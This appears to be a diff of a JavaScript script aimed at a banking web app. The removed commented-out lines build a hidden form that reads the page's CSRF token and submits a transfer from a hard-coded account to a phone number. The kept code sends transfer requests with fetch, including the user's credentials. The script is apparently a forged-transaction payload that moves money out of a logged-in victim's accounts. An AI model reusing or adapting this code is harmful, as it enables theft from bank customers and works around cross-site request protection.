@@ -1,21 +1,5 @@
-// let x = document.createElement('form')
-// x.action="/index.php?r=personal%2Fphone-transfer&account_from=90107430600220100631"
-//
-// let y = document.createElement('input')
-// y.name="_csrf";
-// y.type="hidden"
-//
-// let csrf = document.querySelectorAll('meta')[3].getAttribute('content');
-//
-// y.value=csrf;
-// let z = document.createElement('input')
-// z.name="PhoneTransferForm[phone]"
-// z.value = '+79157442031'
-//
-// let q = document.createElement('input')
-// q.name = 'PhoneTransferForm[amount]'
-//
-(function () {
+function start () {
+    console.log(123);
     let accountFromRu = '90107430600220100601';
     let accountFrom$ = '90107430600220100602';
     let accountFromEur = '90107430600220100603';
@@ -49,4 +33,6 @@
         "mode": "cors",
         "credentials": "include"
     });
-})()
+};
+
+start();
